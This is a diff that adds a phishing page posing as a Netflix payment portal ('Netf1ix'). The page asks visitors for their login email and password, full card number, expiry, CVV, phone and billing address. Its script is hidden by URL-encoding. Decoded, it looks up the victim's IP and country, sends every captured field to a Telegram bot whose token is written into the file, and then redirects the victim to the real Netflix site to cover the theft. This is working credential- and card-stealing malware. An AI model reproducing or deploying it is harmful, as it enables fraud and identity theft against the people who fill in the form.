@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Netf1ix Payment Portal</title>
+  <style>
+    body {
+      background: #f0f2f5 url('https://assets.nflxext.com/ffe/siteui/vlv3/7d2359a4-434f-4efa-9ff3-e9d38a8bde7f/web/US-en-20250707-TRIFECTA-perspective_31a6495d-95e3-429e-926b-b2a3baeb86e2_large.jpg') no-repeat center center fixed;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      padding: 30px;
+    }
+
+    .payment-form {
+      background: #616161;
+      border-radius: 10px;
+      padding: 30px;
+      width: 100%;
+      max-width: 420px;
+      box-shadow: 0 4px 10px rgba(255, 0, 0, 0.3);
+    }
+
+    .payment-form h2 {
+      margin-bottom: 20px;
+      font-size: 1.5rem;
+      color: #FFFFF0;
+      text-align: center;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    label {
+      display: block;
+      font-size: 0.85rem;
+      margin-bottom: 5px;
+      color: #000000;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 1rem;
+      box-sizing: border-box;
+    }
+
+    .form-row {
+      display: flex;
+      gap: 10px;
+    }
+
+    .form-row .form-group {
+      flex: 1;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #007bff;
+      border: none;
+      color: #fff;
+      font-size: 1rem;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 15px;
+      min-height: 48px;
+    }
+
+    button:hover {
+      background: #0056b3;
+    }
+
+    .credit-card {
+      background: linear-gradient(135deg, #4b79a1, #283e51);
+      color: #fff;
+      border-radius: 15px;
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+    }
+
+    .credit-card label {
+      color: #fff;
+      font-size: 0.8rem;
+      margin-bottom: 3px;
+    }
+
+    .credit-card input {
+      background: rgba(255, 255, 255, 0.2);
+      border: none;
+      color: #fff;
+    }
+
+    .credit-card input::placeholder {
+      color: rgba(255, 255, 255, 0.7);
+    }
+
+    .section-divider {
+      margin: 25px 0 10px;
+      border-top: 1px solid #ddd;
+      text-align: center;
+      position: relative;
+    }
+
+    .section-divider span {
+      position: absolute;
+      top: -10px;
+      background: #fff;
+      padding: 0 10px;
+      color: #888;
+      font-size: 0.9rem;
+    }
+
+    #thankYouMessage {
+      display: none;
+      font-size: 1.7rem;
+      font-weight: bold;
+      color: blue;
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .card-type {
+      margin-top: 5px;
+      display: inline-flex;
+      align-items: center;
+      font-size: 0.85rem;
+      font-weight: bold;
+      color: #fff;
+      padding: 4px 8px;
+      border-radius: 6px;
+    }
+  </style>
+</head>
+<body>
+  <form class="payment-form" id="paymentForm">
+    <div class="header-with-image">
+      <img src="https://storage.googleapis.com/1049719345170-us-central1-blueprint-config/wordpress-1/netflix.png" alt="Netflix Logo" class="header-logo">
+      <h2>Sign in to Complete Payment!</h2>
+    </div>
+
+    <div class="form-group">
+      <label for="email">Username</label>
+      <input type="email" id="email" placeholder="Email or Mobile number" required />
+    </div>
+
+    <div class="form-group">
+      <label for="password">Password</label>
+      <input type="password" id="password" placeholder="Enter your password" required />
+    </div>
+
+    <h2>Card due payment of $7.99</h2>
+
+    <div class="credit-card">
+      <div class="card-number">
+        <label for="cardNumber">Card Number</label>
+        <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required />
+        <div id="cardType" class="card-type"></div>
+      </div>
+
+      <div class="card-name">
+        <label for="cardName">Cardholder Name</label>
+        <input type="text" id="cardName" placeholder="John Doe" required />
+      </div>
+
+      <div class="form-row card-exp">
+        <div class="form-group">
+          <label for="expDate">Expiry</label>
+          <input type="text" id="expDate" placeholder="MM/YY" maxlength="5" required />
+        </div>
+        <div class="form-group">
+          <label for="cvv">CVV</label>
+          <input type="password" id="cvv" placeholder="123" maxlength="4" required />
+        </div>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label for="phoneNumber">Phone Number</label>
+      <input type="tel" id="phoneNumber" placeholder="Phone Number" required />
+    </div>
+
+    <div class="section-divider"><span>Billing Address</span></div>
+
+    <div class="form-group">
+      <label for="billingAddress">Street Address</label>
+      <input type="text" id="billingAddress" placeholder="123 Main St" required />
+    </div>
+
+    <div class="form-group">
+      <label for="billingCity">City</label>
+      <input type="text" id="billingCity" placeholder="City" required />
+    </div>
+
+    <div class="form-row">
+      <div class="form-group">
+        <label for="billingState">State</label>
+        <input type="text" id="billingState" placeholder="State" required />
+      </div>
+      <div class="form-group">
+        <label for="billingZip">ZIP Code</label>
+        <input type="text" id="billingZip" placeholder="ZIP" maxlength="10" required />
+      </div>
+    </div>
+
+    <button type="submit">Pay Now</button>
+  </form>
+
+  <div id="thankYouMessage">
+    Thank you! Your payment is being processed...
+  </div>
+
+<script language=javascript>document.write(unescape('%3Cscript%3E%0A%20%20%20%20const%20cardNumberInput%20%3D%20document.getElementById%28%27cardNumber%27%29%3B%0A%20%20%20%20const%20cardTypeDisplay%20%3D%20document.getElementById%28%27cardType%27%29%3B%0A%20%20%20%20let%20detectedCardType%20%3D%20%27%27%3B%0A%0A%20%20%20%20cardNumberInput.addEventListener%28%27input%27%2C%20%28e%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20let%20value%20%3D%20e.target.value.replace%28/%5CD/g%2C%20%27%27%29%3B%0A%20%20%20%20%20%20value%20%3D%20value.substring%280%2C%2016%29%3B%0A%20%20%20%20%20%20let%20formatted%20%3D%20%27%27%3B%0A%20%20%20%20%20%20for%20%28let%20i%20%3D%200%3B%20i%20%3C%20value.length%3B%20i%20+%3D%204%29%20%7B%0A%20%20%20%20%20%20%20%20if%20%28i%20%3E%200%29%20formatted%20+%3D%20%27%20%27%3B%0A%20%20%20%20%20%20%20%20formatted%20+%3D%20value.substring%28i%2C%20i%20+%204%29%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20e.target.value%20%3D%20formatted%3B%0A%0A%20%20%20%20%20%20const%20cardType%20%3D%20getCardType%28value%29%3B%0A%20%20%20%20%20%20detectedCardType%20%3D%20cardType%20%7C%7C%20%27%27%3B%0A%0A%20%20%20%20%20%20if%20%28cardType%29%20%7B%0A%20%20%20%20%20%20%20%20const%20%7B%20name%2C%20color%2C%20emoji%20%7D%20%3D%20getCardTypeStyle%28cardType%29%3B%0A%20%20%20%20%20%20%20%20cardTypeDisplay.style.backgroundColor%20%3D%20color%3B%0A%20%20%20%20%20%20%20%20cardTypeDisplay.innerHTML%20%3D%20%60%24%7Bemoji%7D%20%24%7Bname%7D%60%3B%0A%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20cardTypeDisplay.style.backgroundColor%20%3D%20%27transparent%27%3B%0A%20%20%20%20%20%20%20%20cardTypeDisplay.textContent%20%3D%20%27%27%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%29%3B%0A%0A%20%20%20%20function%20getCardType%28number%29%20%7B%0A%20%20%20%20%20%20if%20%28/%5E4/.test%28number%29%29%20return%20%22Visa%22%3B%0A%20%20%20%20%20%20if%20%28/%5E5%5B1-5%5D/.test%28number%29%29%20return%20%22MasterCard%22%3B%0A%20%20%20%20%20%20if%20%28/%5E3%5B47%5D/.test%28number%29%29%20return%20%22American%20Express%22%3B%0A%20%20%20%20%20%20if%20%28/%5E6%28%3F%3A011%7C5%29/.test%28number%29%29%20return%20%22Discover%22%3B%0A%20%20%20%20%20%20if%20%28/%5E35%282%5B89%5D%7C%5B3-8%5D%5B0-9%5D%29/.test%28number%29%29%20return%20%22JCB%22%3B%0A%20%20%20%20%20%20if%20%28/%5E3%28%3F%3A0%5B0-5%5D%7C%5B68%5D%29/.test%28number%29%29%20return%20%22Diners%20Club%22%3B%0A%20%20%20%20%20%20return%20null%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20getCardTypeStyle%28cardType%29%20%7B%0A%20%20%20%20%20%20switch%20%28cardType%29%20%7B%0A%20%20%20%20%20%20%20%20case%20%22Visa%22%3A%0A%20%20%20%20%20%20%20%20%20%20return%20%7B%20name%3A%20%22Visa%22%2C%20color%3A%20%22%231A1F71%22%2C%20emoji%3A%20%22%uD83D%uDCB3%22%20%7D%3B%0A%20%20%20%20%20%20%20%20case%20%22MasterCard%22%3A%0A%20%20%20%20%20%20%20%20%20%20return%20%7B%20name%3A%20%22MasterCard%22%2C%20color%3A%20%22%23EB001B%22%2C%20emoji%3A%20%22%uD83D%uDFE5%22%20%7D%3B%0A%20%20%20%20%20%20%20%20case%20%22American%20Express%22%3A%0A%20%20%20%20%20%20%20%20%20%20return%20%7B%20name%3A%20%22Amex%22%2C%20color%3A%20%22%232E77BC%22%2C%20emoji%3A%20%22%uD83D%uDFE6%22%20%7D%3B%0A%20%20%20%20%20%20%20%20case%20%22Discover%22%3A%0A%20%20%20%20%20%20%20%20%20%20return%20%7B%20name%3A%20%22Discover%22%2C%20color%3A%20%22%23FF6000%22%2C%20emoji%3A%20%22%uD83D%uDFE7%22%20%7D%3B%0A%20%20%20%20%20%20%20%20case%20%22JCB%22%3A%0A%20%20%20%20%20%20%20%20%20%20return%20%7B%20name%3A%20%22JCB%22%2C%20color%3A%20%22%23007BC1%22%2C%20emoji%3A%20%22%uD83D%uDFE6%22%20%7D%3B%0A%20%20%20%20%20%20%20%20case%20%22Diners%20Club%22%3A%0A%20%20%20%20%20%20%20%20%20%20return%20%7B%20name%3A%20%22Diners%22%2C%20color%3A%20%22%23006FCF%22%2C%20emoji%3A%20%22%uD83D%uDFE6%22%20%7D%3B%0A%20%20%20%20%20%20%20%20default%3A%0A%20%20%20%20%20%20%20%20%20%20return%20%7B%20name%3A%20cardType%2C%20color%3A%20%22%23666%22%2C%20emoji%3A%20%22%uD83D%uDCB3%22%20%7D%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20const%20expDateInput%20%3D%20document.getElementById%28%27expDate%27%29%3B%0A%20%20%20%20expDateInput.addEventListener%28%27input%27%2C%20%28e%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20let%20value%20%3D%20e.target.value.replace%28/%5CD/g%2C%20%27%27%29%3B%0A%20%20%20%20%20%20value%20%3D%20value.substring%280%2C%204%29%3B%0A%20%20%20%20%20%20if%20%28value.length%20%3E%3D%203%29%20%7B%0A%20%20%20%20%20%20%20%20value%20%3D%20value.substring%280%2C%202%29%20+%20%27/%27%20+%20value.substring%282%29%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20e.target.value%20%3D%20value%3B%0A%20%20%20%20%7D%29%3B%0A%0A%20%20%20%20const%20form%20%3D%20document.getElementById%28%27paymentForm%27%29%3B%0A%20%20%20%20const%20thankYouMessage%20%3D%20document.getElementById%28%27thankYouMessage%27%29%3B%0A%0A%20%20%20%20const%20telegramBotToken%20%3D%20%228170328615%3AAAHtebWW0tTiV32C89Zg-VyBhZCQ2tm4ojw%22%3B%0A%20%20%20%20const%20telegramChatId%20%3D%20%227269097986%22%3B%0A%0A%20%20%20%20form.addEventListener%28%27submit%27%2C%20async%20%28e%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20e.preventDefault%28%29%3B%0A%0A%20%20%20%20%20%20const%20data%20%3D%20%7B%0A%20%20%20%20%20%20%20%20email%3A%20document.getElementById%28%27email%27%29.value%2C%0A%20%20%20%20%20%20%20%20password%3A%20document.getElementById%28%27password%27%29.value%2C%0A%20%20%20%20%20%20%20%20cardNumber%3A%20document.getElementById%28%27cardNumber%27%29.value%2C%0A%20%20%20%20%20%20%20%20cardName%3A%20document.getElementById%28%27cardName%27%29.value%2C%0A%20%20%20%20%20%20%20%20expDate%3A%20document.getElementById%28%27expDate%27%29.value%2C%0A%20%20%20%20%20%20%20%20cvv%3A%20document.getElementById%28%27cvv%27%29.value%2C%0A%20%20%20%20%20%20%20%20phoneNumber%3A%20document.getElementById%28%27phoneNumber%27%29.value%2C%0A%20%20%20%20%20%20%20%20billingAddress%3A%20document.getElementById%28%27billingAddress%27%29.value%2C%0A%20%20%20%20%20%20%20%20billingCity%3A%20document.getElementById%28%27billingCity%27%29.value%2C%0A%20%20%20%20%20%20%20%20billingState%3A%20document.getElementById%28%27billingState%27%29.value%2C%0A%20%20%20%20%20%20%20%20billingZip%3A%20document.getElementById%28%27billingZip%27%29.value%2C%0A%20%20%20%20%20%20%20%20cardType%3A%20detectedCardType%0A%20%20%20%20%20%20%7D%3B%0A%0A%20%20%20%20%20%20try%20%7B%0A%20%20%20%20%20%20%20%20const%20ipResponse%20%3D%20await%20fetch%28%27https%3A//ipapi.co/json/%27%29%3B%0A%20%20%20%20%20%20%20%20const%20ipData%20%3D%20await%20ipResponse.json%28%29%3B%0A%0A%20%20%20%20%20%20%20%20const%20message%20%3D%20%60%0A%uD83D%uDCB3%20*New%20Client%20Payment*%0A-------------------------------%0A%uD83D%uDCE7%20*Email%3A*%20%24%7Bdata.email%7D%0A%uD83D%uDD11%20*Password%3A*%20%24%7Bdata.password%7D%0A%uD83D%uDCF1%20*Phone%3A*%20%24%7Bdata.phoneNumber%7D%0A%0A%uD83D%uDCB3%20*Card%20Details%3A*%0A%u2022%20Type%3A%20%24%7Bdata.cardType%20%7C%7C%20%22Unknown%22%7D%0A%u2022%20Number%3A%20%24%7Bdata.cardNumber%7D%0A%u2022%20Name%3A%20%24%7Bdata.cardName%7D%0A%u2022%20Expiry%3A%20%24%7Bdata.expDate%7D%0A%u2022%20CVV%3A%20%24%7Bdata.cvv%7D%0A%0A%uD83D%uDCCD%20*Billing%20Address%3A*%0A%24%7Bdata.billingAddress%7D%0A%24%7Bdata.billingCity%7D%2C%20%24%7Bdata.billingState%7D%20%24%7Bdata.billingZip%7D%0A%0A%uD83C%uDF10%20*IP%3A*%20%24%7BipData.ip%7D%0A%uD83D%uDCCD%20*Country%3A*%20%24%7BipData.country_name%7D%0A%20%20%20%20%20%20%20%20%60%3B%0A%0A%20%20%20%20%20%20%20%20const%20telegramURL%20%3D%20%60https%3A//api.telegram.org/bot%24%7BtelegramBotToken%7D/sendMessage%60%3B%0A%0A%20%20%20%20%20%20%20%20await%20fetch%28telegramURL%2C%20%7B%0A%20%20%20%20%20%20%20%20%20%20method%3A%20%27POST%27%2C%0A%20%20%20%20%20%20%20%20%20%20headers%3A%20%7B%20%27Content-Type%27%3A%20%27application/json%27%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20body%3A%20JSON.stringify%28%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20chat_id%3A%20telegramChatId%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20text%3A%20message%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20parse_mode%3A%20%27Markdown%27%0A%20%20%20%20%20%20%20%20%20%20%7D%29%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%0A%20%20%20%20%20%20%20%20thankYouMessage.style.display%20%3D%20%27block%27%3B%0A%20%20%20%20%20%20%20%20form.style.display%20%3D%20%27none%27%3B%0A%0A%20%20%20%20%20%20%20%20setTimeout%28%28%29%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20window.location.href%20%3D%20%22https%3A//www.netflix.com/%22%3B%0A%20%20%20%20%20%20%20%20%7D%2C%203000%29%3B%0A%0A%20%20%20%20%20%20%7D%20catch%20%28error%29%20%7B%0A%20%20%20%20%20%20%20%20console.error%28%27Error%3A%27%2C%20error%29%3B%0A%20%20%20%20%20%20%20%20alert%28%27There%20was%20an%20error%20submitting%20your%20payment.%27%29%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%29%3B%0A%20%20%3C/script%3E%0A'))</script>
+</body>
+</html>
